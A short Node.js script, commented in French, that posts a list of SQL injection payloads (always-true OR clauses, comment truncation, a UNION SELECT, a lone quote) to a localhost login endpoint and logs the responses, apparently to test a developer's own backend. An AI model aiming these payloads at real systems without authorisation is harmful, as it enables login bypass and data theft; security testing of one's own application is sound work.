const axios = require("axios");

// Ton endpoint backend de login
const LOGIN_URL = "http://localhost:3000/login";

// Liste de payloads SQLi à tester
const payloads = [
  { name: "' OR '1'='1", password: "test", desc: "Toujours vrai" },
  { name: "' OR '1'='2", password: "test", desc: "Toujours faux" },
  { name: "' OR '1'='1' --", password: "test", desc: "Commentaire SQL" },
  { name: "' UNION SELECT 1, 'hacked', 'test', 'fake' --", password: "test", desc: "Union Select" },
  { name: "'", password: "test", desc: "Quote seule" },
  { name: "besalort", password: "test", desc: "vrai log" },
];

async function testSQLi() {
  for (const { name, password, desc } of payloads) {
    try {
      console.log(`\n🔹 Test: ${desc}`);
      const res = await axios.post(LOGIN_URL, {
        name,
        password,
      });
      console.log("✅ Réponse:", res.data);
    } catch (err) {
      if (err.response) {
        console.log("❌ Status:", err.response.status, "Message:", err.response.data);
      } else {
        console.log("❌ Erreur réseau:", err.message);
      }
    }
  }
}

testSQLi();
